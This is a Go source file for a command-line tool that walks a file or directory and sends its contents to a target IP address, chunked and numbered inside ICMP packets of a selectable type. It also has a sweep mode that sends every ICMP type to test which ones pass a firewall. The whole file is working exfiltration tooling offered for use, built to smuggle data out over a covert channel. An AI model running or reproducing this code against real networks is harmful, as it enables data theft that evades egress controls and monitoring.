package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"io/fs"
	"net"
	"os"
	"path/filepath"
	"time"

	"github.com/mjwhitta/cli"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

var flags struct {
	blockSize    int
	dirPath      string
	filePath     string
	icmpType     int
	runICMPSweep bool
	targetIP     string
}

// createICMPMessage creates an ICMP message with the specified type and payload
func createICMPMessage(icmpType ipv4.ICMPType, seq int, payload []byte) (icmp.Message, error) {
	var msg icmp.Message

	// Types with explicit Echo-like structures (support ID, Seq, Data)
	switch icmpType {
	case ipv4.ICMPTypeEcho,
		ipv4.ICMPTypeEchoReply,
		ipv4.ICMPTypeTimestamp,
		ipv4.ICMPTypeTimestampReply,
		ipv4.ICMPTypeExtendedEchoRequest,
		ipv4.ICMPTypeExtendedEchoReply:
		msg = icmp.Message{
			Type: icmpType,
			Code: 0,
			Body: &icmp.Echo{
				ID:   os.Getpid() & 0xffff,
				Seq:  seq,
				Data: payload,
			},
		}
	case ipv4.ICMPTypeDestinationUnreachable:
		msg = icmp.Message{
			Type: icmpType,
			Code: 0,
			Body: &icmp.DstUnreach{
				Data: payload,
			},
		}
	case ipv4.ICMPTypeTimeExceeded:
		msg = icmp.Message{
			Type: icmpType,
			Code: 0,
			Body: &icmp.TimeExceeded{
				Data: payload,
			},
		}
	case ipv4.ICMPTypeParameterProblem:
		msg = icmp.Message{
			Type: icmpType,
			Code: 0,
			Body: &icmp.ParamProb{
				Data: payload,
			},
		}
	default:
		// For all other types (Redirect, RouterAdvertisement, RouterSolicitation,
		// Photuris, etc.), use RawBody which works with any ICMP type
		msg = icmp.Message{
			Type: icmpType,
			Code: 0,
			Body: &icmp.RawBody{
				Data: payload,
			},
		}
	}

	return msg, nil
}

func init() {
	cli.Flag(
		&flags.blockSize,
		"b",
		"block",
		1000,
		"Block size (in bytes) per ICMP packet",
	)
	cli.Flag(
		&flags.dirPath,
		"d",
		"directory",
		"",
		"Path to directory with files to send - NOTE: you cannot"+
			" pass both a directory AND a file",
	)
	cli.Flag(
		&flags.filePath,
		"f",
		"file",
		"",
		"Path to the file to send - NOTE: you cannot pass both a"+
			" directory AND a file",
	)
	cli.Flag(
		&flags.icmpType,
		"i",
		"icmp-type",
		8,
		"ICMP type number to use. Common types:\n"+
			"  0=Echo Reply, 3=Dest Unreachable, 5=Redirect, 8=Echo (default),\n"+
			"  9=Router Advert, 10=Router Solicit, 11=Time Exceeded,\n"+
			"  12=Parameter Problem, 13=Timestamp, 14=Timestamp Reply,\n"+
			"  40=Photuris, 42=Extended Echo Request, 43=Extended Echo Reply",
	)
	cli.Flag(
		&flags.runICMPSweep,
		"s",
		"sweep",
		false,
		"Sends a single packet of all ICMP types to the server to see what "+
			"gets through",
	)
	cli.Flag(
		&flags.targetIP,
		"t",
		"target",
		"",
		"IP address of the target server where the data will be sent",
	)
	cli.Parse()
	if flags.targetIP == "" {
		cli.Usage(1)
	} else if !flags.runICMPSweep {
		if flags.dirPath == "" && flags.filePath == "" {
			cli.Usage(1)
		} else if flags.dirPath != "" && flags.filePath != "" {
			cli.Usage(1)
		}
	}
}

func main() {
	var err error
	var icmpType ipv4.ICMPType

	if flags.runICMPSweep {
		err = runICMPSweep()
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] Sweep execution failed: %v\n", err)
			os.Exit(1)
		}
		return
	}

	icmpType = ipv4.ICMPType(flags.icmpType)
	if icmpType.String() == "<nil>" {
		fmt.Printf("[!] Unknown ICMP type: %d\n", flags.icmpType)
		cli.Usage(1)
	}
	fmt.Printf("[*] Using ICMP type: %d (%s)\n", flags.icmpType, icmpType)

	if flags.dirPath != "" {
		err = sendDir(flags.dirPath, icmpType)
	} else {
		err = sendFile(flags.filePath, icmpType)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Transfer failed: %v\n", err)
		fmt.Println(
			"[!] " + commonError,
		)
		os.Exit(1)
	}

	fmt.Println("[*] WOOOOOOO! Sending is complete. Have a nice day.")
}

func runICMPSweep() error {
	var err error
	var icmpType ipv4.ICMPType

	for i := range 255 {
		icmpType = ipv4.ICMPType(i)
		// Leaving the following lines as comment in case we change our
		// mind in the future and include only types that are not "reserved
		// for future use", "deprecated", etc.
		/*
			if icmpType.String() == "<nil>" {
				continue
			}
		*/
		fmt.Printf("[*] Using ICMP type: %d (%s)\n", i, icmpType)
		err = sendPacket(icmpType)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] Transfer failed: %v\n", err)
			fmt.Println(
				"[!] " + commonErrorRaw,
			)
			os.Exit(1)
		}
		time.Sleep(1 * time.Millisecond)
	}
	return nil
}

func sendDir(dirPath string, icmpType ipv4.ICMPType) error {
	return filepath.WalkDir(
		filepath.Clean(dirPath),
		func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				return err
			}
			if d.IsDir() {
				return nil
			}
			return sendFile(path, icmpType)
		},
	)
}

func sendFile(filePath string, icmpType ipv4.ICMPType) error {
	var (
		blockNum       int
		buf            []byte
		conn           *icmp.PacketConn
		dst            net.Addr
		err            error
		f              *os.File
		fileNameToSend string
		info           os.FileInfo
		msg            icmp.Message
		msgBytes       []byte
		n              int
		payload        []byte
		totalBlocks    int
	)

	info, err = os.Stat(filePath)
	if err != nil {
		fmt.Println("[!] Error with input file")
		return err
	}

	totalBlocks = int(info.Size()) / flags.blockSize
	if int(info.Size())%flags.blockSize != 0 {
		totalBlocks++
	}

	fmt.Printf(
		"[*] Sending %s (%d bytes) to %s\n",
		info.Name(), info.Size(), flags.targetIP,
	)
	fmt.Printf(
		"[*] Block size: %d bytes | Total blocks: %d\n",
		flags.blockSize, totalBlocks,
	)

	f, err = os.Open(filePath)
	if err != nil {
		return err
	}
	defer f.Close()

	conn, err = icmp.ListenPacket(icmpProto, "0.0.0.0")
	if err != nil {
		return err
	}
	defer conn.Close()

	dst, err = resolveAddr(flags.targetIP)
	if err != nil {
		return err
	}

	// Packet format: [blockNum uint32][totalBlocks uint32][data...]
	// Block 0 is the filename packet; blocks 1..N are file data.

	// Send block 0: filename packet
	if flags.filePath != "" {
		fileNameToSend = filepath.ToSlash(filepath.Base(filePath))
	} else {
		fileNameToSend, err = filepath.Rel(flags.dirPath, filePath)
		fileNameToSend = filepath.ToSlash(fileNameToSend)
		if err != nil {
			return err
		}
	}

	payload = make([]byte, 8+len(fileNameToSend))
	binary.BigEndian.PutUint32(payload[0:4], 0)
	binary.BigEndian.PutUint32(payload[4:8], uint32(totalBlocks))
	copy(payload[8:], []byte(fileNameToSend))

	msg, err = createICMPMessage(icmpType, 0, payload)
	if err != nil {
		return err
	}

	msgBytes, err = msg.Marshal(nil)
	if err != nil {
		return err
	}

	_, err = conn.WriteTo(msgBytes, dst)
	if err != nil {
		return err
	}

	fmt.Printf("[*] Sent filename: %s\n", fileNameToSend)

	buf = make([]byte, flags.blockSize)
	blockNum = 1

	for {
		n, err = f.Read(buf)
		if n == 0 {
			break
		}
		if err != nil && err != io.EOF {
			return err
		}

		payload = make([]byte, 8+n)
		binary.BigEndian.PutUint32(
			payload[0:4], uint32(blockNum),
		)
		binary.BigEndian.PutUint32(
			payload[4:8], uint32(totalBlocks),
		)
		copy(payload[8:], buf[:n])

		msg, err = createICMPMessage(icmpType, blockNum&0xffff, payload)
		if err != nil {
			return err
		}

		msgBytes, err = msg.Marshal(nil)
		if err != nil {
			return err
		}

		_, err = conn.WriteTo(msgBytes, dst)
		if err != nil {
			return err
		}

		fmt.Printf(
			"\r[*] Sent block %d of %d",
			blockNum, totalBlocks,
		)
		blockNum++
		time.Sleep(time.Millisecond)
	}

	fmt.Println()
	return nil
}

func sendPacket(icmpType ipv4.ICMPType) error {
	var (
		conn *icmp.PacketConn
		dst  net.Addr
		err  error
	)

	conn, err = icmp.ListenPacket(icmpProtoRaw, "0.0.0.0")
	if err != nil {
		return err
	}
	defer conn.Close()

	dst, err = resolveAddrRaw(flags.targetIP)
	if err != nil {
		return err
	}

	msg, err := createICMPMessage(icmpType, 0, nil)
	if err != nil {
		return err
	}

	msgBytes, err := msg.Marshal(nil)
	if err != nil {
		return err
	}

	_, err = conn.WriteTo(msgBytes, dst)
	if err != nil {
		return err
	}

	fmt.Printf("[*] Sent ICMP packet of type: %d\n", icmpType)
	return nil
}
